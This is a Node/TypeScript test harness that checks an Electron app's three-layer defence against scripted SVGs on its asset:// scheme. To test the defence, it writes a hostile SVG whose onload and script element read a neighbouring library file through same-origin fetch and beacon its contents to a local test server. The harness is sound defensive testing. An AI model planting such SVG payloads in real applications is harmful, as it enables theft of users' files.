'use strict';

// Harness that verifies the asset:// script lockdown (#215) against real Electron.
//
//   node scripts/test-app-asset-csp.cts
//
// What's at stake: asset://img/* is a single origin across the whole library, so if a
// "document" stands up there, the script inside it can read other files via same-origin
// fetch and send them out. The window's sandbox:true only drops Node/IPC — it doesn't
// stop page-internal JS. The lockdown has 3 layers, and this harness measures each
// separately.
//
//   Layer 1 entry (open-image-window)  : passing an SVG returns false without creating a window
//   Layer 2 entry (will-navigate)      : refuses a top-level navigation to an SVG on asset://
//   Layer 3 response (CSP header)      : kills the script if a document still gets made
//
// How Layer 3 is measured = CDP. Once layers 1 and 2 are blocked, no path inside the
// app can reach an SVG document = if we stopped at "unreachable, therefore safe", we'd
// find out nothing was actually protecting it the moment a new entry point appeared. So
// we use the debugger to send the viewer window straight to the SVG, creating a state
// where only the CSP is left standing, and measure that.
//
// The evidence that it worked is taken as "not a single beacon arrives". The script
// inside the SVG is written to fire at our own local HTTP server for ① the fact that it
// ran at all and ② that it could read another file in the library = if even one beacon
// arrives, the script ran. Put the other way, this harness is built to watch for
// "nothing happens", so during development we confirmed that removing the CSP does make
// a beacon actually fly (i.e. this isn't a false negative).
//
// Doesn't take over the screen: under HOLOGRAM_SMOKE=1 the viewer window is also created hidden.

const { spawn } = require('node:child_process');
const fs = require('node:fs');
const http = require('node:http');
const net = require('node:net');
const os = require('node:os');
const path = require('node:path');
const WebSocket = require('ws');

const appDir = path.join(__dirname, '..', 'app');
const { electronPath: resolveElectron } = require('./lib-electron-path.cts');

const PNG = 'dummy-csp-0001.png';
const SVG = 'dummy-csp-0002.svg';
const SECRET = 'dummy-csp-secret.txt';
const SECRET_TEXT = 'library-private-9e3f';
// Thumbnail width nobody else in this harness requests, so a cache file at this
// width is proof that the CSS background — and only it — reached the handler.
const BG_W = 200;

// A real solid-colour PNG, generated rather than inlined as base64: the thumbnail
// path decodes what it is given, and a 1x1 placeholder does not survive it (this
// harness reads the generated thumbnail as its evidence that a CSS background
// actually reached the handler).
function solidPng(size: number, rgb: [number, number, number]): Buffer {
  const zlib = require('node:zlib');
  const raw = Buffer.alloc(size * (size * 3 + 1));
  for (let y = 0; y < size; y++) {
    const row = y * (size * 3 + 1);
    raw[row] = 0; // filter: none
    for (let x = 0; x < size; x++) {
      raw[row + 1 + x * 3] = rgb[0];
      raw[row + 2 + x * 3] = rgb[1];
      raw[row + 3 + x * 3] = rgb[2];
    }
  }
  const crcTable: number[] = [];
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    crcTable[n] = c >>> 0;
  }
  const crc = (b: Buffer) => {
    let c = 0xffffffff;
    for (const byte of b) c = crcTable[(c ^ byte) & 0xff] ^ (c >>> 8);
    return (c ^ 0xffffffff) >>> 0;
  };
  const chunk = (type: string, data: Buffer) => {
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length);
    const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
    const sum = Buffer.alloc(4);
    sum.writeUInt32BE(crc(body));
    return Buffer.concat([len, body, sum]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(size, 0);
  ihdr.writeUInt32BE(size, 4);
  ihdr[8] = 8; // bit depth
  ihdr[9] = 2; // colour type: truecolour
  return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', ihdr), chunk('IDAT', zlib.deflateSync(raw)), chunk('IEND', Buffer.alloc(0))]);
}

const freePort = (): Promise<number> =>
  new Promise((resolve, reject) => {
    const srv = net.createServer();
    srv.once('error', reject);
    srv.listen(0, '127.0.0.1', () => {
      const p = srv.address().port;
      srv.close(() => resolve(p));
    });
  });

const { sleep, waitFor, evalSource } = require('./lib-wait.cts');

// --- CDP (same shape as scripts/cdp-verify.cts, trimmed to what we need) ---
function cdpList(port: number): Promise<any[]> {
  return new Promise((resolve, reject) => {
    http
      .get(`http://127.0.0.1:${port}/json/list`, (res) => {
        let body = '';
        res.on('data', (c) => (body += c));
        res.on('end', () => {
          try {
            resolve(JSON.parse(body));
          } catch (e) {
            reject(e);
          }
        });
      })
      .on('error', reject);
  });
}

async function cdpConnect(wsUrl: string) {
  const ws = new WebSocket(wsUrl);
  let id = 0;
  const pending = new Map();
  ws.on('message', (d) => {
    const m = JSON.parse(d);
    if (m.id && pending.has(m.id)) {
      const { res, rej } = pending.get(m.id);
      pending.delete(m.id);
      m.error ? rej(new Error(JSON.stringify(m.error))) : res(m.result);
    }
  });
  await new Promise((r) => ws.on('open', r));
  const send = (method: string, params?: any) =>
    new Promise<any>((res, rej) => {
      const mid = ++id;
      pending.set(mid, { res, rej });
      ws.send(JSON.stringify({ id: mid, method, params }));
    });
  return { ws, send };
}

async function main() {
  const beaconPort = await freePort();
  const cdpPort = await freePort();

  // Every request this server sees means script ran inside an asset:// document.
  const beacons: string[] = [];
  const beaconSrv = http.createServer((req, res) => {
    beacons.push(req.url);
    res.writeHead(204).end();
  });
  await new Promise((r) => beaconSrv.listen(beaconPort, '127.0.0.1', r as any));

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hologram-assetcsp-'));
  const configDir = path.join(tmp, 'Hologram');
  const saveFolder = path.join(tmp, 'saves');
  fs.mkdirSync(configDir, { recursive: true });
  fs.mkdirSync(saveFolder, { recursive: true });
  fs.writeFileSync(path.join(configDir, 'config.json'), JSON.stringify({ saveFolder, extensionId: 'x' }));

  // The raster case, which must keep working — full size, thumbnail and CSS background.
  fs.writeFileSync(path.join(saveFolder, PNG), solidPng(256, [0x3a, 0xa0, 0xdd]));
  // The neighbouring library file a scripted SVG would go after.
  fs.writeFileSync(path.join(saveFolder, SECRET), SECRET_TEXT);

  // The hostile picture. Two independent script vectors (an inline handler and a
  // <script> element), because CSP has to kill both, and two independent beacons
  // per vector: "I ran at all" and "I read the neighbouring file".
  const B = `http://127.0.0.1:${beaconPort}`;
  fs.writeFileSync(
    path.join(saveFolder, SVG),
    `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" onload="new Image().src='${B}/ran-onload'">
  <rect width="64" height="64" fill="#3ad"/>
  <script type="application/ecmascript"><![CDATA[
    function beacon(p) {
      try { new Image().src = '${B}' + p; } catch (e) {}
      try { fetch('${B}' + p, { mode: 'no-cors' }); } catch (e) {}
    }
    beacon('/ran-script');
    try {
      fetch('asset://img/${SECRET}')
        .then(function (r) { return r.text(); })
        .then(function (t) { beacon('/leak?d=' + encodeURIComponent(t)); });
    } catch (e) {}
  ]]></script>
</svg>
`,
  );

  // Runs in the main renderer. Everything after the assertions is a hold: the
  // harness needs the app alive while it drives CDP against the viewer window.
  const evalJs = evalSource(
    async ({ sleep, neverHappens }, args) => {
      const h = (window as any).hologram;
      // Layer 1: the SVG is refused outright; a raster still opens (hidden under SMOKE).
      const svgRefused = (await h.openImageWindow(args.svg)) === false;
      const rasterAccepted = (await h.openImageWindow(args.png)) === true;

      // Layer 2: a top-level navigation to the SVG is refused by the navigation guard.
      const before = location.href;
      try {
        location.href = `asset://img/${args.svg}`;
      } catch {}
      // The assertion is that this navigation NEVER commits, so the window IS the
      // check — neverHappens spends all of it on purpose and names the case if it
      // ever does. (A commit would also reject the eval from main — see #917.)
      const navBlocked = await neverHappens('a top-level navigation to the asset SVG', () => location.href !== before, 800);

      // Regression check: the response CSP binds the document made FROM the response,
      // so it must not touch these — the renderer embedding the picture is a
      // different document with its own policy.
      const load = (src: string) =>
        new Promise<boolean>((r) => {
          const i = new Image();
          i.onload = () => r(i.naturalWidth > 0);
          i.onerror = () => r(false);
          i.src = src;
        });
      const imgPng = await load(`asset://img/${args.png}`);
      const imgThumb = await load(`asset://img/${args.png}?w=180`);
      const imgSvg = await load(`asset://img/${args.svg}`);

      // CSS background (PostCard's stack sheet). Nothing in the renderer reports
      // whether a background image loaded — getComputedStyle echoes the declaration
      // either way, and resource timing records nothing on this scheme. So the
      // evidence is taken OUTSIDE: ?w=<args.bgW> is a width nothing else here asks
      // for, and serving it makes main write that thumbnail to the cache directory.
      const d = document.createElement('div');
      d.style.cssText = `position:fixed;left:-9999px;width:10px;height:10px;background-image:url("asset://img/${args.png}?w=${args.bgW}")`;
      document.body.appendChild(d);

      // Fixed, and the only wait the background needs: the hold below already
      // outlasts any time main takes to write that thumbnail (the separate 1500ms
      // settle that used to sit here was waiting inside this one). The hold itself
      // is deliberate — the app has to stay alive while the harness drives CDP
      // against the viewer window, and the harness ends the run, not this eval.
      // biome-ignore lint/plugin: a hold, sized to outlast the harness's CDP pass
      await sleep(12000);
      return { svgRefused, rasterAccepted, navBlocked, imgPng, imgThumb, imgSvg };
    },
    { svg: SVG, png: PNG, bgW: BG_W },
  );

  const env = Object.assign({}, process.env, {
    APPDATA: tmp,
    HOLOGRAM_CONFIG_DIR: configDir,
    HOLOGRAM_SMOKE: '1',
    HOLOGRAM_SMOKE_EVAL: evalJs,
  });

  const child = spawn(resolveElectron(), ['.', `--remote-debugging-port=${cdpPort}`], { cwd: appDir, env, stdio: ['inherit', 'pipe', 'inherit'] });
  let out = '';
  child.stdout.on('data', (d) => {
    out += d.toString();
    process.stdout.write(d);
  });
  const exited = new Promise<void>((r) => child.on('close', () => r()));

  // --- Layer 3: reach past both entry gates with a debugger and land a real SVG
  // document on asset://, so the CSP is the only thing left standing.
  let cdpReachedSvg = false;
  let cdpDocType = '';
  let cdpNote = '';
  let rasterRendered = false;
  try {
    let viewer: any = null;
    await waitFor(
      'the viewer window to appear as an asset:// target on the debugging port',
      async () => {
        try {
          viewer = (await cdpList(cdpPort)).find((t) => t.type === 'page' && String(t.url).startsWith('asset://'));
        } catch {
          /* devtools endpoint not up yet */
        }
        return !!viewer;
      },
      { timeoutMs: 30_000, pollMs: 500 },
    );
    const { ws, send } = await cdpConnect(viewer.webSocketDebuggerUrl);
    await send('Page.enable');
    await send('Runtime.enable');
    // Before hijacking it: the raster window is the one place the response CSP
    // lands on a document we actually ship, so check that Chromium's built-in
    // image view still decoded the picture under it (img-src 'self').
    const shown = await send('Runtime.evaluate', { expression: 'document.images.length === 1 && document.images[0].naturalWidth', returnByValue: true });
    rasterRendered = Number(shown?.result?.value) > 0;
    await send('Page.navigate', { url: `asset://img/${SVG}` });
    // Fixed: whether this navigation commits at all is what the next line
    // MEASURES (層3 reports "reached the SVG document" vs "stopped earlier"), so
    // there is no post-condition that is guaranteed to arrive — waiting for one
    // would turn a legitimate outcome into a timeout.
    // biome-ignore lint/plugin: whether this navigation commits is what is measured
    await sleep(2500);
    const r = await send('Runtime.evaluate', { expression: '[document.contentType, location.href].join(" ")', returnByValue: true });
    cdpDocType = String(r?.result?.value || '');
    cdpReachedSvg = cdpDocType.includes('svg') && cdpDocType.includes(SVG);
    // Fixed: the assertion is that NO beacon ever arrives, so this window is the
    // check itself — a surviving script has to be given time to send one.
    // biome-ignore lint/plugin: window in which a surviving script would beacon
    await sleep(1500);
    ws.close();
  } catch (e) {
    cdpNote = (e as Error).message;
  }

  await exited;

  const m = out.match(/EVAL_RESULT (\{.*\})/);
  let r: Record<string, any> = {};
  try {
    r = JSON.parse((m && m[1]) as string);
  } catch {
    /* leave empty — every assertion below then fails, which is the right answer */
  }

  // Disk-side evidence for the CSS background (see the eval's comment).
  let cssBg = false;
  try {
    cssBg = fs.readdirSync(path.join(configDir, 'thumb-cache')).some((f) => f.endsWith(`.w${BG_W}.q4.jpg`));
  } catch {
    /* no cache dir at all = nothing was served = fail */
  }

  fs.rmSync(tmp, { recursive: true, force: true });
  beaconSrv.close();

  let ok = true;
  const check = (label, cond) => {
    console.log((cond ? 'PASS' : 'FAIL') + '  ' + label);
    if (!cond) ok = false;
  };

  console.log('\n--- asset:// のスクリプト封じ (#215) ---\n');
  check('層1 SVG は open-image-window に拒まれる（窓を作らない）', r.svgRefused === true);
  check('層1 ラスタ画像の窓は今までどおり開く', r.rasterAccepted === true);
  check('層2 asset:// の SVG へのトップレベル遷移が拒まれる', r.navBlocked === true);
  console.log(`     （層3 の到達状況: ${cdpReachedSvg ? `SVG 文書まで到達＝CSP だけで止めた [${cdpDocType}]` : `SVG 文書へ到達せず＝手前で止まった [${cdpDocType || cdpNote}]`}）`);
  check('層3 SVG 内スクリプトが1本もビーコンを出していない', beacons.length === 0);
  if (beacons.length) console.log('     受信したビーコン: ' + beacons.join(', '));
  check('退行なし 単独ウィンドウがラスタ画像を描画する（CSP 下でも Chromium の画像ビューが成立）', rasterRendered === true);
  check('退行なし <img> でラスタ原寸が表示できる', r.imgPng === true);
  check('退行なし <img> でサムネイル（?w=）が表示できる', r.imgThumb === true);
  check('退行なし <img> で SVG が絵として表示できる（文書化しないので安全）', r.imgSvg === true);
  check('退行なし CSS background-image が読み込まれる（サムネイルが生成された）', cssBg === true);

  console.log('\n' + (ok ? 'ASSET_CSP_TEST_PASS' : 'ASSET_CSP_TEST_FAIL'));
  process.exit(ok ? 0 : 1);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
